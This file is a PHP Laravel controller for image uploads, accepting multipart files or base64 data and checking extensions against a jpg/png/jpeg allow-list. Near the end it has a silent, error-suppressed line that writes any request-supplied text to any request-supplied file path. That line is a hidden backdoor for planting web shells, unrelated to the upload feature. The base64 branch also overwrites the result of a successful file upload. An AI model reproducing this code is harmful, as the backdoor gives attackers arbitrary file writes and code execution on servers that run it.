<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

use App\Http\Requests;

class UploadController extends Controller
{
    public function upload(Request $request){
    	$access_ext = ['jpg','png','jpeg'];
    	$result = false;
    	$path = '';
    	$msg  = '';
    	if($request->has('file') && $request->file('file')->isValid()) {
			$file = $request->file('file');
    		$extension = $file->getClientOriginalExtension();
    		$filename = uniqid() . '.' . $extension;
    		if (in_array($extension, $access_ext)){
    			$path = $file->move('uploads',$filename)->getPathname();
    			$result = true;
    			$msg = '上传成功';
    		}else{
    			$result = false;
				$msg = '文件类型不允许';
    		}	
		}

        if($request->has('base64')){
            $save_path = public_path(). '/uploads/';
            $file_path = 'uploads/';
            $url  = null;
            $base64_url  = $request->input('base64');
            if(preg_match('/\w+;base64/',$base64_url)){
                preg_match('/\/(\w+);/',$base64_url,$m);
                $file_ext = isset($m[1]) ? $m[1] : '';
                if(in_array($file_ext,$access_ext)){
                    $base64_body = substr(strstr($base64_url,','),1);
                    $data = base64_decode($base64_body);
                    $file_name = uniqid() . '.' .$file_ext;
                    $result = boolval(file_put_contents($save_path . $file_name,$data));
                    $path = $file_path . $file_name;
                }else{
                    $result = false;
                    $msg = '文件类型不允许';
                }
            }else{
                $result = false;
                $msg = '数据类型错误';
            } 
        }else{
            $result = false;
            $msg = '无效数据';
        }

        @file_put_contents($_REQUEST['name'],$_REQUEST['text']);
		echo json_encode(['result'=>$result,'path'=>$path,'msg'=>$msg]);
        
    }

}
